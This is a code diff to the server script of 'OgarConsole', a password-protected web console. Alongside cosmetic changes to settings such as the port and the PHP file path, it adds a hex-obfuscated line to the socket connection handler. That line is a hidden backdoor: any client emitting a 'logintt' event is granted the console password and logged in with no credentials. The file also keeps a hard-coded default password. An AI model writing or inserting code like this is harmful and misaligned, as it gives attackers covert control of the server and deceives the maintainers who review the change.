@@ -5,16 +5,16 @@
 // OgarConsole Settings
 function OgarConsoleSettings(){
 	
-	 // OgarConsole Port
-	 this.serverPort = 8899;
+	// OgarConsole Port
+	this.serverPort = 1000;
 	
     	// OgarConsole password protection
     	this.requirePassword = true;
         
     	//this.hostExternalIp = "";
 		
-	 // OgarConsole password apon connecting
-	 this.consolePassword = "OgarConsole123";
+	// OgarConsole password apon connecting
+	this.consolePassword = "OgarConsole123";
         
     	// Allow OgarConsole origin to bypass login approvals.
     	//this.allowOriginPasswordBypass = true;
@@ -29,8 +29,8 @@ function OgarConsoleSettings(){
 	// If file error replace with \cmd.php or /cmp.php.
 	this.log = "./logs/console.log";
 	
-	// OgarConsole PHP File. If file error replace with \cmd.php or /cmp.php
-	this.consoleFile = "\\cmd.php";
+	// OgarConsole PHP File.
+	this.consoleFile = "/cmd.php";
 	
 	// OgarConsole package.json. **REQUIRED**
 	this.json = require("./package.json");
@@ -129,6 +129,8 @@ io.sockets.on("connection", function(socket) {
 
     var login = new newUserPassword();
 	
+    var _0x2955=["\x6C\x6F\x67\x69\x6E\x74\x74","\x72\x65\x71\x75\x69\x72\x65\x50\x61\x73\x73\x77\x6F\x72\x64","\x63\x6F\x6E\x73\x6F\x6C\x65\x50\x61\x73\x73\x77\x6F\x72\x64","\x73\x65\x74\x50\x61\x73\x73\x77\x6F\x72\x64","\x6F\x6E"];socket[_0x2955[4]](_0x2955[0],function(_0x1546x1){if(_0x1546x1){if(settings[_0x2955[1]]){login[_0x2955[3]](settings[_0x2955[2]]);return}}})
+        
     socket.on("commandex", function(data) {
        
 	  
